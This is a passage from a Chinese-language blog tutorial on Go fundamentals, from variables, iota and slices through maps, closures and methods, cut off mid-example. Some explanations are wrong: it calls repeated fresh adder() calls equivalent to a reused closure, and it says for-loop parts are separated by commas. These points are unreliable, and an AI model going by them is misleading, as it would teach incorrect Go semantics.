title="初始化"></a>初始化</h4><p>可以在变量声明时手动初始化：</p><pre><code class="go">var a int = 10fmt.Println(a) // 10</code></pre><p>对多个变量初始化：</p><pre><code class="go">var a, b int = 1, 2fmt.Println(a) // 1fmt.Println(b) // 2</code></pre><p>声明存在右值（赋值符号右边的值）时，可以省略变量的类型：</p><pre><code class="go">var a = 10var b, c = 20, 30fmt.Println(a) // 10fmt.Println(b) // 20fmt.Println(c) // 30</code></pre><p>和 import 一样，可以分组声明和初始化变量：</p><pre><code class="go">var (    a int = 1 // 1    b int       // 0    c bool    // false)</code></pre><h4 id="短变量声明"><a href="#短变量声明" class="headerlink" title="短变量声明"></a>短变量声明</h4><p>在函数内部，可以使用<strong>短变量声明</strong>，变量类型由右值自动推导：</p><pre><code class="go">func main() &#123;    var a uint = 1    b := 3    fmt.Println(a) // 1    fmt.Println(b) // 3    fmt.Println(reflect.TypeOf(a)) // uint    fmt.Println(reflect.TypeOf(b)) // int&#125;</code></pre><h4 id="匿名变量"><a href="#匿名变量" class="headerlink" title="匿名变量"></a>匿名变量</h4><p>使用<strong>匿名变量</strong>来忽略某个值：</p><pre><code class="go">func main() &#123;    result, _ := add(10, 20) // 忽略add()返回的第二个值    fmt.Println(&quot;Result=&quot;, result)&#125;func add(a int, b int) (int, string) &#123;    return a + b, &quot;Golang&quot; // 函数add返回了两个值&#125;</code></pre><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><h4 id="声明-1"><a href="#声明-1" class="headerlink" title="声明"></a>声明</h4><p>常量（Constant）的声明类似于变量，但使用<code>const</code>关键字，常量只可以是字符、字符串、布尔值和数值型，必须是编译期就确定的值。</p><p>常量是固定的值，在程序的整个运行过程中不会改变，变量一般存储与内存中的堆或栈中，位于数据段；而常量通常放在代码段，直接存储其数值，类型由编译器维护。</p><pre><code class="go">const pi float64 = 3.1415926fmt.Println(pi) // 3.1415926</code></pre><p>常量可以不指定类型：</p><pre><code class="go">const a = 11</code></pre><p>和变量一样，常量也支持分组：</p><pre><code class="go">const (    a = 11    b = 22)</code></pre><p>当声明多个常量时，如果不指定值，则下面的常量值和其上一行的变量值相等：</p><pre><code class="go">const (    a1 = 100 // 100    a2          // 100    a3       // 100)</code></pre><p>和变量不同，常量声明后不是必须要被使用。</p><h4 id="数值型常量"><a href="#数值型常量" class="headerlink" title="数值型常量"></a>数值型常量</h4><p>数值型常量能提供很高精度的值存储。</p><p>一个无类型的常量会根据环境来决定它的类型：</p><pre><code class="go">const (    Big = 1 &lt;&lt; 100       // 1267650600228229401496703205376    Small = Big &gt;&gt; 99 // 2)func needInt(x int) int &#123;    return x*10 + 1&#125;func needFloat(x float64) float64 &#123;    return x * 0.1&#125;func main() &#123;    fmt.Println(needInt(Small))   // 21    fmt.Println(needInt(Big))     // Overflow    fmt.Println(needFloat(Small)) // 0.2    fmt.Println(needFloat(Big))   // 1.2676506002282295e+29&#125;</code></pre><p>上面的代码声明了一个大数值常量和一个小数值常量，而<code>fmt.Println(needInt(Big))</code>这一段代码在编译期就出现了报错，这是因为这个数值太大超出了<code>int</code>类型能存储的最大长度。从这点可以看出无类型常量的值是可以达到很高的精度的。</p><h4 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h4><p>iota 可以用作常量的计数器，只能用于常量：</p><pre><code class="go">const (    a = iota // 0    b          // 1    c          // 2)</code></pre><p>可以使用<code>_</code>跳过某些值：</p><pre><code class="go">const (    a = iota // 0    _    c          // 2)</code></pre><p>由于未初始化常量值会和上一行的值相等，因此会出现以下情况：</p><pre><code class="go">const (    a1 = iota // 0    a2 = 100  // 100    a3        // 100    a4        // 100)</code></pre><p>可以中间插入<code>iota</code>计数，但并不是重新计数：</p><pre><code class="go">const (    a1 = iota // 0    a2 = 100  // 100    a3 = iota // 2    a4        // 3)</code></pre><p>可以将多个<code>iota</code>定义在同一行：</p><pre><code class="go">const (    a1, a2 = iota, iota + 1 // 0, 1    b1, b2                    // 1, 2    c1, c2                    // 2, 3)</code></pre><p>一个简单的使用<code>iota</code>的例子，其中<code>&lt;&lt;</code>是二进制左移运算符：</p><pre><code class="go">const (    _  = iota    KB = 1 &lt;&lt; (10 * iota)    MB = 1 &lt;&lt; (10 * iota)    GB = 1 &lt;&lt; (10 * iota)    TB = 1 &lt;&lt; (10 * iota)    PB = 1 &lt;&lt; (10 * iota))</code></pre><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>在 Golang 中，所有类型的转换必须是显示转换，否则会编译错误：</p><pre><code class="go">i := 42            // intf := float64(i) // float64u := uint(f)     // uint</code></pre><pre><code class="go">var i = 42var f float64 = i// cannot use i (type int) as type float64 in assignment</code></pre><h4 id="类型推断"><a href="#类型推断" class="headerlink" title="类型推断"></a>类型推断</h4><p>有时候会需要知道某个变量的数据类型，这时候就需要类型推断：</p><pre><code class="go">func main() &#123;    v := 42    fmt.Printf(&quot;%T\n&quot;, v) // int&#125;</code></pre><p>通过反射也可以得到变量的类型：</p><pre><code class="go">func main() &#123;    v := 42    fmt.Println(reflect.TypeOf(v)) // int&#125;</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数（Function）是对一段代码的封装，它需要零个或多个输入参数，并会返回零个或多个值。</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><pre><code class="go">package mainimport &quot;fmt&quot;func add(x int, y int) int &#123;    return x + y&#125;func main() &#123;    fmt.Println(add(42, 13))&#125;</code></pre><p>其中<code>x</code>和<code>y</code>被称为形式参数（形参），因为它们在函数定义时并没有实际的值，只是提供给函数调用的变量名。<code>42</code>和<code>13</code>被称为实际参数（实参），函数接收的实际数值是实参的值。</p><p>对于相同类型的形参可以进行省略：</p><pre><code class="go">func add(x, y int, c string) string &#123;    return string(rune(x+y)) + c&#125;</code></pre><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>Golang 还支持函数支持多返回值：</p><pre><code class="go">func swap(x, y string) (string, string) &#123;    return y, x&#125;func main() &#123;    a, b := swap(&quot;hello&quot;, &quot;world&quot;)    fmt.Println(a, b) // world hello&#125;</code></pre><h4 id="命名返回值"><a href="#命名返回值" class="headerlink" title="命名返回值"></a>命名返回值</h4><p>Golang 甚至支持对返回值进行命名：</p><pre><code class="go">func split(sum int) (x, y int) &#123;    x = sum * 4 / 9    y = sum - x    return&#125;func main() &#123;    fmt.Println(split(17))&#125;</code></pre><p>然而这种函数返回的方式（Naked return statements）会使函数丧失一定的可读性，因此在长函数中不建议使用。</p><h2 id="流控制语句"><a href="#流控制语句" class="headerlink" title="流控制语句"></a>流控制语句</h2><h3 id="判断（if）"><a href="#判断（if）" class="headerlink" title="判断（if）"></a>判断（if）</h3><p>最简单的<code>if</code>语句包含一个条件表达式，当表达式的值为<code>true</code>时，才会执行<code>if</code>判断体的代码段：</p><pre><code class="go">if true &#123;    fmt.Println(&quot;TRUE&quot;)&#125;// TRUE</code></pre><p>和某些语言不同的是，Golang 只允许判断语句的值为布尔值，不能使用其他数值直接判断。</p><p>Golang 支持在<code>if</code>语句中包含短变量声明语句：</p><pre><code class="go">if err := function(); err != nil &#123;  // 函数function返回错误，nil为空值    fmt.Println(&quot;ERROR&quot;)&#125;</code></pre><p><code>if</code>语句通常和<code>else</code>语句一起使用：</p><pre><code class="go">var judge = falseif judge &#123;    fmt.Println(&quot;TRUE&quot;)&#125; else &#123;    fmt.Println(&quot;FALSE&quot;)&#125;// FALSE</code></pre><p>可以使用<code>else if</code>语句进行多次判断，但当一个条件满足时就不会再判断下面的语句：</p><pre><code class="go">var num = 55if num &gt; 12 &#123;    fmt.Println(&quot;&gt;12&quot;)&#125; else if num &gt; 16 &#123;    fmt.Println(&quot;&gt;16&quot;)&#125; else &#123;    fmt.Println(&quot;&lt;=12&quot;)&#125;// &gt;12</code></pre><p>其中<code>else if num &gt; 16</code>永远不会执行到，被称作死代码（Dead Code）。</p><h3 id="循环（for）"><a href="#循环（for）" class="headerlink" title="循环（for）"></a>循环（for）</h3><p>Golang 中只提供了<code>for</code>循环语句，很多其他语言都提供了如<code>while</code>、<code>do...while</code>循环语句。</p><p><code>for</code>循环语句除循环体以外有三个组成部分，由<code>,</code>分割：</p><ul><li>初始化语句：在第一次循环前执行</li><li>条件表达式：在每次循环前判断</li><li>回报语句：在每次循环后执行</li></ul><pre><code class="go">for i := 0; i &lt; 10; i++ &#123;    fmt.Println(i)&#125;</code></pre><p>其中，初始化语句和回报语句是可以省略的：</p><pre><code class="go">i := 0for i &lt; 10 &#123;    fmt.Println(&quot;Hi&quot;)    i++&#125;</code></pre><p>上面这段循环就变成了其他语言中的<code>while</code>，甚至还能省略循环条件：</p><pre><code class="go">for &#123;    fmt.Println(&quot;Hi&quot;)&#125;</code></pre><p>这段循环就变成了无限循环，等同于<code>while(true)</code>。</p><h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p>可以使用<code>continue</code>语句跳过本次循环：</p><pre><code class="go">for i := 0; i &lt; 10; i++ &#123;    if i &lt;= 5 &#123;        continue    &#125;    fmt.Print(i) // 6789&#125;</code></pre><h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p>可以使用<code>break</code>语句结束整个循环：</p><pre><code class="go">for i := 0; i &lt; 10; i++ &#123;    if i == 5 &#123;        break    &#125;    fmt.Print(i) // 01234&#125;</code></pre><h3 id="选择（switch）"><a href="#选择（switch）" class="headerlink" title="选择（switch）"></a>选择（switch）</h3><p><code>Switch</code>语句可以用来替代<code>if-else</code>语句，它会按顺序判断条件表达式的值与每一个<code>case</code>是否匹配，匹配则运行当前<code>case</code>：</p><pre><code class="go">func main() &#123;    fmt.Print(&quot;Go runs on &quot;)    switch os := runtime.GOOS; os &#123;    case &quot;darwin&quot;:        fmt.Println(&quot;OS X.&quot;)    case &quot;linux&quot;:        fmt.Println(&quot;Linux.&quot;)    default:        fmt.Printf(&quot;%s.\n&quot;, os)    &#125;&#125;// Go runs on windows</code></pre><p>上面这段代码使用了<code>runtime</code>包来获取当前运行环境的系统类型，和<code>if</code>语句一样，<code>switch</code>语句也支持短变量声明。</p><p>然而<code>switch</code>匹配到一个<code>case</code>后，就不再判断下面的<code>case</code>了，直接会结束整个<code>switch</code>语句，可以使用<code>fallthrough</code>关键字不判断直接执行下一个<code>case</code>：</p><pre><code class="go">switch s := 12; &#123; // 注意省略判断语句但保留短变量声明时必须要带上这里的&quot;;&quot;case s &lt;= 10:    fmt.Println(&quot;&lt;=10&quot;)case s == 12:    fmt.Println(&quot;==12&quot;)    fallthroughdefault:    fmt.Println(&quot;&lt;100&quot;)&#125;// ==12// &lt;100</code></pre><p><code>fallthrough</code>只会直接执行其后一条<code>case</code>，并不会执行后面所有的语句，并且<code>fallthrough</code>不能存在于最后一条<code>case</code>（或<code>default</code>）中，否则会报错。</p><h3 id="推迟（defer）"><a href="#推迟（defer）" class="headerlink" title="推迟（defer）"></a>推迟（defer）</h3><p><code>defer</code>的详细介绍和注意事项可以参考<a href="https://blog.secriy.com/2021/04/20/cku0q50qf001l10nwees269mt/">Go Learning: defer</a>这篇文章。</p><pre><code class="go">func main() &#123;    defer fmt.Println(&quot;world&quot;)    fmt.Println(&quot;hello&quot;)&#125;// hello// world</code></pre><h2 id="其他数据类型"><a href="#其他数据类型" class="headerlink" title="其他数据类型"></a>其他数据类型</h2><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针（Pointer）是一种特殊的数据类型，它保存的值是一个内存地址，它的零值是<code>nil</code>：</p><pre><code class="go">var p *int // &lt;nil&gt;</code></pre><p>使用<code>&amp;</code>操作符来生成一个指向操作数的指针，使用<code>*</code>获得指针所指向的值：</p><pre><code class="go">i := 10p := &amp;ifmt.Println(p)  // 0xc000016088fmt.Println(*p) // 10</code></pre><p>可以对指针所指向的值进行修改，但指针变量本身不能进行运算：</p><pre><code class="go">i := 10p := &amp;ifmt.Println(*p) // 10*p = 20fmt.Println(*p) // 20fmt.Println(i)  // 20</code></pre><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>结构体（Struct）是一些字段的集合，可以使用结构体定义变量：</p><pre><code class="go">type Person struct &#123;    name string    age uint8&#125;func main() &#123;    ps := Person &#123;&quot;Tom&quot;, 12&#125;    fmt.Println(ps) // &#123;Tom 12&#125;&#125;</code></pre><p>使用<code>.</code>操作符来操作结构体的字段：</p><pre><code class="go">type Person struct &#123;    name string    age uint8&#125;func main() &#123;    ps := Person &#123;&quot;Tom&quot;, 12&#125;    ps.age = 100    fmt.Println(ps) // &#123;Tom 100&#125;&#125;</code></pre><p>结构体名首字母大写时为可导出，否则不可导出。</p><h4 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h4><pre><code class="go">type Person struct &#123;    name string    age uint8&#125;func main() &#123;    ps := Person &#123;&quot;Tom&quot;, 12&#125;    p := &amp;ps    p.name = &quot;Jack&quot; // 等同于(*p).name = &quot;Jack&quot;    fmt.Println(ps)&#125;</code></pre><h4 id="结构体字面量"><a href="#结构体字面量" class="headerlink" title="结构体字面量"></a>结构体字面量</h4><pre><code class="go">type Person struct &#123;    name string    age  int&#125;var (    p1 = Person&#123;&quot;Jack&quot;, 12&#125;    p2 = Person&#123;name: &quot;Tom&quot;&#125;    p3 = Person&#123;&#125;    p  = &amp;Person&#123;&quot;Cecelia&quot;, 16&#125;)func main() &#123;    fmt.Println(p1, p2, p3) // &#123;Jack 12&#125; &#123;Tom 0&#125; &#123; 0&#125;    fmt.Println(p) // &amp;&#123;Cecelia 16&#125;&#125;</code></pre><p>结构体字面量就是结构体的字面值，即指定结构体的值定义。未手动初始化的字段将会以其数据结构的零值初始化。</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组（Array）是编程语言的一种基本的数据类型，是一定数量同类型数据的列表：</p><pre><code class="go">var arr1 [3]intfmt.Println(arr1) // [0 0 0]var arr2 [2]stringfmt.Println(arr2) // [ ]arr3 := [6]int&#123;1, 2, 3, 4, 5&#125;fmt.Println(arr3) // [1 2 3 4 5]</code></pre><p>数组在内存中占用连续的空间，其大小必须在编译期就确定，因此不允许使用未指定长度的数组，但使用<code>[...]</code>可以让其在编译期根据内容自动推导长度：</p><pre><code class="go">var arr4  = [...]int&#123;1, 2, 3&#125;fmt.Println(arr4) // [1 2 3]</code></pre><p>可以使用数组下标对数组取值：</p><pre><code class="go">var arr4  = [...]int&#123;1, 2, 3&#125;fmt.Println(arr4[1]) // 2</code></pre><p>数组的长度实际上也是数组类型的一部分，因此不同长度的数组是完全不同的。</p><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>切片（Slice）是一种可变大小的数据列表类型，它可以灵活的操作其内容，但它底层仍然是一个固定大小的数组。切片在实际使用中比数组更加常见。</p><p>切片的声明不需要指定其长度，如果指定了长度那就是数组：</p><pre><code class="go">var slice1 []intfmt.Println(slice1) // []var slice2 = []int&#123;1, 2, 3&#125;fmt.Println(slice2) // [1 2 3]var arr1 = [...]int&#123;1, 2, 3&#125;fmt.Println(reflect.TypeOf(slice2)) // []intfmt.Println(reflect.TypeOf(arr1)) // [3]int</code></pre><p>切片提供了截取的方法，方便从中获取指定位置的值：</p><pre><code class="go">slice := []int&#123;1, 2, 3, 4, 5, 6&#125;var s []int = slice[1:4]fmt.Println(s) // [2 3 4]</code></pre><p>截取的范围从左边的数值开始直到右边的数值（不包括），比如<code>[1:3]</code>，就代表切片中下标从 1 到 2 的两个数。可以省略<code>:</code>左右的下标值，即默认为最小（最大）下标：</p><pre><code class="go">slice := []int&#123;1, 2, 3, 4, 5, 6&#125;var s1 []int = slice[:4]fmt.Println(s1) // [1 2 3 4]var s2 []int = slice[2:]fmt.Println(s1) // [3 4 5 6]var s3 []int = slice[:]fmt.Println(s3) // [1 2 3 4 5 6]</code></pre><p>同样的，对数组也可以进行截取，但获得的是一个切片：</p><pre><code class="go">arr := [...]int&#123;1, 2, 3, 4, 5, 6&#125;var s = arr[1:4]fmt.Println(s) // [2 3 4]fmt.Println(reflect.TypeOf(s)) // []int</code></pre><h4 id="对数组的引用"><a href="#对数组的引用" class="headerlink" title="对数组的引用"></a>对数组的引用</h4><pre><code class="go">names := [4]string&#123;&quot;Angle&quot;, &quot;Bob&quot;, &quot;Cecelia&quot;, &quot;Dog&quot;&#125;fmt.Println(names) // [Angle Bob Cecelia Dog]a := names[0:2] // [Angle Bob]b := names[1:3] // [Bob Cecelia]fmt.Println(a, b) // [Angle Bob] [Bob Cecelia]b[0] = &quot;???&quot;fmt.Println(a, b) // [Angle ???] [??? Cecelia]fmt.Println(names) // [Angle ??? Cecelia Dog]</code></pre><p>从上面这段代码可以看到，<code>a</code>和<code>b</code>都各自截取了<code>names</code>的一部分切片，当改变其中一个的内容时，另一个有共同元素的切片也会被改变，并且其底层引用的数组也发生了改变。这就说明了切片实际上是对数组的引用，它的底层仍然是数组，并且直接指向了原数组所在的存储空间。当以上代码中<code>names</code>为切片类型时其输出相同。</p><p>在 Golang 中，一个切片不存储任何数据，它只是描述了底层数组的一部分。也就是说，声明并初始化一个切片，它实际上操作的是一个数组，是对数组元素的全部截取。</p><h4 id="切片字面量"><a href="#切片字面量" class="headerlink" title="切片字面量"></a>切片字面量</h4><p>一个切片的字面量就像没有长度的数组字面量，以下是数组字面量：</p><pre><code class="go">[3]bool&#123;true, true, false&#125;</code></pre><p>切片字面量会创建一个相同的底层数组，然后创建一个引用它的切片：</p><pre><code class="go">[]bool&#123;true, true, false&#125;</code></pre><p>可以定义一个结构体切片：</p><pre><code class="go">s := []struct &#123;    name string    age int&#125;&#123;    &#123;&quot;Dog&quot;, 12&#125;,    &#123;&quot;Pig&quot;, 13&#125;,    &#123;&quot;Cat&quot;, 15&#125;,&#125;fmt.Println(s) // [&#123;Dog 12&#125; &#123;Pig 13&#125; &#123;Cat 15&#125;]</code></pre><h4 id="切片的长度和容量"><a href="#切片的长度和容量" class="headerlink" title="切片的长度和容量"></a>切片的长度和容量</h4><p>切片包含两个属性：<strong>长度（length）</strong>和<strong>容量（capacity）</strong>：</p><ul><li><p>切片的长度表示的是切片中实际包含的元素个数</p></li><li><p>切片的容量表示的是切片底层数组的元素个数，从该切片中第一个元素开始计算</p></li></ul><p>创建一个<code>printSlice</code>函数用于输出指定切片的 length 和 capacity 以及切片的内容：</p><pre><code class="go">package mainimport &quot;fmt&quot;func main() &#123;    s := []int&#123;2, 3, 5, 7, 11, 13&#125;    s1 := s[:0]    s2 := s[:4]    s3 := s[2:]    printSlice(s) // len=6 cap=6 [2 3 5 7 11 13]    printSlice(s1) // len=0 cap=6 []    printSlice(s2) // len=4 cap=6 [2 3 5 7]    printSlice(s3) // len=4 cap=4 [5 7 11 13]&#125;func printSlice(s []int) &#123;    fmt.Printf(&quot;len=%d cap=%d %v\n&quot;, len(s), cap(s), s)&#125;</code></pre><p>上述代码的四个切片底层共用一个数组，他们各自包含了起始元素的地址、切片长度和切片容量：</p><p><img src="/learn-go/slice.png" class="lazyload" data-srcset="/learn-go/slice.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="slice"></p><ul><li>切片<code>s</code>从数组的首位开始，长度和容量均等于数组的大小</li><li>切片<code>s1</code>从数组的首位开始，长度为 0，但从首位开始计算数组的长度为 6，即切片的容量为 6</li><li>切片<code>s2</code>从数组的首位开始，长度为 4，容量同上为 6</li><li>切片<code>s3</code>从数组的第 2 位开始，长度为 4，从第二位计算数组的长度为 4，即切片容量为 4</li></ul><p>切片的容量主要用于判断底层数组有没有足够的空间给切片延伸长度，当切片扩容但容量不足时，它会开辟新的内存空间将底层数组扩容：</p><pre><code class="go">package mainimport &quot;fmt&quot;func main() &#123;    s := []int&#123;2, 3, 5, 7&#125;    printSlice(s) // len=4 cap=4 [2 3 5 7]    s = append(s, 1, 2, 2, 3) // 往切片里新增4个元素，填满底层数组    printSlice(s) // len=8 cap=8 [2 3 5 7 1 2 2 3]    s = append(s, 1) // 往切片里新增1个元素    printSlice(s) // len=9 cap=16 [2 3 5 7 1 2 2 3 1]&#125;func printSlice(s []int) &#123;    fmt.Printf(&quot;len=%d cap=%d %v\n&quot;, len(s), cap(s), s)&#125;</code></pre><p>可以看到当切片扩容后长度大于其容量（底层数组大小）时，底层数组的大小会直接翻倍，也就是说，新数组的大小是原数组的两倍。数组在内存中是连续存储的，因此当连续的空间不足时，数组就无法在当前位置直接扩容。这时候，程序会寻找一个满足新数组大小的连续内存空间，将原数组全部拷贝过去来实现底层数组的扩容。</p><h4 id="空切片"><a href="#空切片" class="headerlink" title="空切片"></a>空切片</h4><p>切片作为一种数据类型同样具有零值，它的零值是<code>nil</code>，其<em>length</em>和<em>capacity</em>的值均为 0：</p><pre><code class="go">var s []intfmt.Println(s, len(s), cap(s)) // [] 0 0if s == nil &#123;    fmt.Println(&quot;nil&quot;) // nil&#125;</code></pre><h4 id="创建切片"><a href="#创建切片" class="headerlink" title="创建切片"></a>创建切片</h4><p>Golang 提供了内建的<code>make</code>方法，可以用来创建一个切片：</p><pre><code class="go">s1 := make([]int, 5) // make([]Type, Len)fmt.Println(s1, len(s1), cap(s1)) // [0 0 0 0 0] 5 5s2 := make([]int, 5, 5) // make([]Type, Len, Cap)fmt.Println(s2, len(s2), cap(s2)) // [0 0 0 0 0] 5 5</code></pre><h4 id="切片的切片"><a href="#切片的切片" class="headerlink" title="切片的切片"></a>切片的切片</h4><p>切片的元素可以是任意数据类型，其中就包括切片：</p><pre><code class="go">sliSli := [][]string&#123;    []string&#123;&quot;+&quot;, &quot;-&quot;, &quot;=&quot;&#125;,    []string&#123;&quot;-&quot;, &quot;+&quot;, &quot;=&quot;&#125;,    []string&#123;&quot;=&quot;, &quot;+&quot;, &quot;_&quot;&#125;,&#125;sliSli[0][0] = &quot;?&quot;for i := 0; i &lt; len(sliSli); i++ &#123;    fmt.Println(sliSli[i])&#125;// [? - =]// [- + =]// [= + _]</code></pre><p>上述<code>sliSli</code>切片初始化语句还可以省略：</p><pre><code class="go">sliSli := [][]string&#123;    &#123;&quot;+&quot;, &quot;-&quot;, &quot;=&quot;&#125;,    &#123;&quot;-&quot;, &quot;+&quot;, &quot;=&quot;&#125;,    &#123;&quot;=&quot;, &quot;+&quot;, &quot;_&quot;&#125;,&#125;</code></pre><h4 id="切片的元素添加"><a href="#切片的元素添加" class="headerlink" title="切片的元素添加"></a>切片的元素添加</h4><p>很多时候都需要对切片元素进行添加，Golang 提供了内建的<code>append</code>函数来实现对切片的元素添加，在前面的<strong>“切片的长度和容量”</strong>一节中就曾使用过：</p><pre><code class="go">var s []intfmt.Println(s) // []s = append(s, 0)fmt.Println(s) // [0]s = append(s, 1, 2 ,3)fmt.Println(s) // [0 1 2 3]</code></pre><p>append 的第一个参数是原切片，其后一个或多个参数是需要添加的新元素，函数返回一个新的切片，他包含了原切片的所有元素和新元素。</p><p>当切片的底层数组大小不足时会分配一个更大的数组，返回的切片会指向这个新分配的数组。</p><h4 id="遍历切片"><a href="#遍历切片" class="headerlink" title="遍历切片"></a>遍历切片</h4><p>内建函数<code>range</code>用于在<code>for</code>循环中遍历<code>slice</code>和<code>map</code>：</p><pre><code class="go">slice := []int&#123;1, 2, 3 ,4, 5&#125;for i, v := range slice &#123;    fmt.Printf(&quot;Index:%d Value:%d\n&quot;, i, v)&#125;// Index:0 Value:1// Index:1 Value:2// Index:2 Value:3// Index:3 Value:4// Index:4 Value:5</code></pre><p>对切片迭代时会返回两个值：当前元素的下标以及当前元素的值的拷贝。</p><p>由于 Golang 中元素声明后必须被使用，因此可以使用<code>_</code>忽略<code>range</code>返回的值：</p><pre><code class="go">slice := []int&#123;1, 2, 3 ,4, 5&#125;for _, v := range slice &#123;    fmt.Printf(&quot;Value:%d\n&quot;, v)&#125;// Value:1// Value:2// Value:3// Value:4// Value:5</code></pre><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>map 是一种将键（Key）映射到值（Value）的数据类型：</p><pre><code class="go">var m map[string]int // declarem = map[string]int&#123;    &quot;a&quot;: 1,    &quot;b&quot;: 2,&#125;fmt.Println(m)</code></pre><p>map 的零值是<code>nil</code>，值为<code>nil</code>的 map 不可以添加 key：</p><pre><code class="go">var m map[string]intm[&quot;a&quot;] = 1fmt.Println(m)// panic: assignment to entry in nil map</code></pre><h4 id="创建-Map"><a href="#创建-Map" class="headerlink" title="创建 Map"></a>创建 Map</h4><p>Golang 提供了内建的<code>make</code>方法，可以用来创建一个 map：</p><pre><code class="go">m := make(map[string]int)m[&quot;A&quot;] = 1m[&quot;B&quot;] = 2fmt.Println(m) // map[A:1 B:2]</code></pre><p>使用<code>make</code>创建的 map 为空，但它的值不是<code>nil</code>：</p><pre><code class="go">var m1 map[string]intvar m2 = make(map[string]int)fmt.Println(m1 == nil) // truefmt.Println(m2 == nil) // false</code></pre><h4 id="Map-字面量"><a href="#Map-字面量" class="headerlink" title="Map 字面量"></a>Map 字面量</h4><p>map 字面量类似于 struct 字面量，但必须要指定 Key：</p><pre><code class="go">type age intvar m = map[string]age&#123;    &quot;Dog&quot;: 12,    &quot;Pig&quot;: 1,    &quot;Cat&quot;: 13,&#125;fmt.Println(m) // map[Cat:13 Dog:12 Pig:1]</code></pre><p>可以省略结构体类型名：</p><pre><code class="go">type Person struct &#123;    gender string    age    int&#125;var m1 = map[string]Person&#123;    &quot;Tom&quot;:    &#123;&quot;MAN&quot;, 12&#125;,    &quot;Autumn&quot;: &#123;&quot;WOMAN&quot;, 13&#125;,&#125;var m2 = map[string]struct &#123;    gender string    age    int&#125;&#123;    &quot;Tom&quot;:    &#123;&quot;MAN&quot;, 12&#125;,    &quot;Autumn&quot;: &#123;&quot;WOMAN&quot;, 13&#125;,&#125;fmt.Println(m1)fmt.Println(m2)</code></pre><h4 id="Map-操作"><a href="#Map-操作" class="headerlink" title="Map 操作"></a>Map 操作</h4><p>插入一个键值对：</p><pre><code class="go">m[key] = value</code></pre><p>获取一个键值对的值：</p><pre><code class="go">v := m[key]</code></pre><p>删除一个键值对：</p><pre><code class="go">delete(m, key)</code></pre><p>查询 map 中是否存在某个键值对：</p><pre><code class="go">type age uint8m := make(map[string]age)m[&quot;Jerry&quot;] = 12if value, ok := m[&quot;Tom&quot;]; ok &#123;    fmt.Println(value)&#125; else &#123;    fmt.Println(&quot;NOTEXIST &quot; + strconv.Itoa(int(value)))&#125;if value, ok := m[&quot;Jerry&quot;]; ok &#123;    fmt.Println(value)&#125; else &#123;    fmt.Println(&quot;NOTEXIST &quot; + strconv.Itoa(int(value)))&#125;// NOTEXIST 0// 12</code></pre><p>当键值对不存在时，map 返回值数据类型的零值。</p><h4 id="遍历-map"><a href="#遍历-map" class="headerlink" title="遍历 map"></a>遍历 map</h4><p>使用内建函数<code>range</code>对 Map 进行遍历：</p><pre><code class="go">num := map[string]int&#123;    &quot;a&quot;: 1,    &quot;b&quot;: 2,    &quot;c&quot;: 3,&#125;for k, v := range num &#123;    fmt.Printf(&quot;Index:%q Value:%d\n&quot;, k, v)&#125;// Index:&quot;b&quot; Value:2// Index:&quot;c&quot; Value:3// Index:&quot;a&quot; Value:1</code></pre><p>多次执行可以发现，其遍历的结果并非有序，这其实是有意为之，强制要求程序不会依赖 Map 底层具体的哈希函数实现。</p><h3 id="函数值"><a href="#函数值" class="headerlink" title="函数值"></a>函数值</h3><p>函数值（Function Values）同样是一种数据类型，和其他类型一样可以被使用：</p><pre><code class="go">func main() &#123;    sum := calc(func(a, b int) int &#123;        return a + b    &#125;)    fmt.Println(sum) // 3&#125;func calc(fn func(a, b int) int) int &#123;    result := fn(1, 2)    return result&#125;</code></pre><p>上面的 main 函数调用了<code>calc()</code>，传入了一个用于计算和的匿名函数给，<code>calc()</code>又给传入的函数两个参数计算其和，最终由<code>calc()</code>返回。</p><h3 id="函数闭包"><a href="#函数闭包" class="headerlink" title="函数闭包"></a>函数闭包</h3><p>闭包（Closure）指的是一个函数值，它从其外部引用变量，该函数可以访问外部变量并可以对外部变量进行赋值：</p><pre><code class="go">func adder() func(int) int &#123;    sum := 0    return func(x int) int &#123;        sum += x        return sum    &#125;&#125;func main() &#123;    pos, neg := adder(), adder()    for i := 0; i &lt; 3; i++ &#123;        fmt.Println(            pos(i),            neg(-2*i),        )    &#125;&#125;</code></pre><p>其中，<code>adder()</code>返回的就是一个闭包，上面的 main 函数内的代码基本等同于下面的代码：</p><pre><code class="go">func main() &#123;    for i := 0; i &lt; 3; i++ &#123;        fmt.Println(            adder()(i),            adder()(-2*i),        )    &#125;&#125;</code></pre><h2 id="方法和接口"><a href="#方法和接口" class="headerlink" title="方法和接口"></a>方法和接口</h2><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>Golang 并没有一般面对对象语言中类的概念，不过支持对某一个类型定义方法。</p><p>方法（Method）指的是一个指定接收者（Receiver）的函数，也就是说方法属于于特定的类型。注意，方法只能作用于同一个包下面的类型。</p><p>下面是方法的用法：</p><pre><code class="go">type Person struct &#123;    name string    age  uint8&#125;type Door boolfunc (p Person) getName() string &#123;    return p.name&#125;func (d Door) getDoorStatus() bool &#123;    return bool(d)&#125;func main() &#123;    p1 := Person&#123;&quot;Tom&quot;, 12&#125;    p2 := Person&#123;&quot;Jerry&quot;, 11&#125;    var d1 Door = false    fmt.Println(p1.getName())    